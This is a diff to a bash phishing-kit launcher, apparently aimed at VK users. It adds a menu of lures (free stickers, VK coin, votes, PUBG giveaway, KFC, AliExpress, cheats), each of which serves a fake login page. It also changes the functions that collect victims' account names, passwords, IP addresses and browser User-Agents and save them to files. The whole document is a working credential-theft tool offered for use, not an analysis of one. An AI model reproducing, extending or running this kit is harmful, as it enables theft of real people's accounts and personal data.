@@ -1,3 +1,5 @@
+
+
 #!/bin/bash
 
 
@@ -17,7 +19,22 @@ printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m VK coin\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Подарки\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры2(лучший вариант)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры3(выбор пользователей)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Стикеры3(Doesn't work!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m BOOM\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Oбычная авторизация#1\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Голосование #1\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Ответы\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Накрутка\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Магазин\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m PUBG раздача\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m KFC\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Голоса VK\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Бесплатные стикеры\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m Закрытая группа(Need some customize!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Читы\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Петиции(Custom)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Алиэкспресс\e[0m\n"
+
 printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
@@ -37,6 +54,49 @@ server="siol"
 start1
 elif [[ $option == 5 || $option == 05 ]]; then
 server="stikj"
+start1
+elif [[ $option == 6 || $option == 06 ]]; then
+server="boom"
+start1
+elif [[ $option == 7 || $option == 07 ]]; then
+server="boom/vk"
+start1
+elif [[ $option == 8 || $option == 08 ]]; then
+server="vote7241"
+start1
+elif [[ $option == 9 || $option == 09 ]]; then
+server="otvets"
+start1
+
+elif [[ $option == 10 ]]; then
+server="nakrutka"
+start1
+elif [[ $option == 11 ]]; then
+server="magazine"
+start1
+elif [[ $option == 12 ]]; then
+server="layout"
+start1
+elif [[ $option == 13 ]]; then
+server="kfs"
+start1
+elif [[ $option == 14 ]]; then
+server="golos"
+start1
+elif [[ $option == 15 ]]; then
+server="freesticks"
+start1
+elif [[ $option == 16 ]]; then
+server="closed_group"
+start1
+elif [[ $option == 17 ]]; then
+server="cheats"
+start1
+elif [[ $option == 18 ]]; then
+server="change"
+start1
+elif [[ $option == 19 ]]; then
+server="aliex"
 start1
 
 elif [[ $option == 99 ]]; then
@@ -141,13 +201,13 @@ printf '</html>\n' >> sites/create/login.html
 }
 
 catch_cred() {
-
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+echo "wfwf"
+account=$(grep -o 'Account:.*' password.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' password.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+cat password.txt >> saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"
@@ -156,14 +216,14 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentia
 
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
+touch sites/$server/ip.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+cat sites/$server/ip.txt >> saved.ip.txt
 
 if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
@@ -378,10 +438,10 @@ catch_ip
 rm -rf sites/$server/ip.txt
 fi
 sleep 0.5
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e "password.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf sites/$server/usernames.txt
+rm -rf password.txt
 fi
 sleep 0.5
 
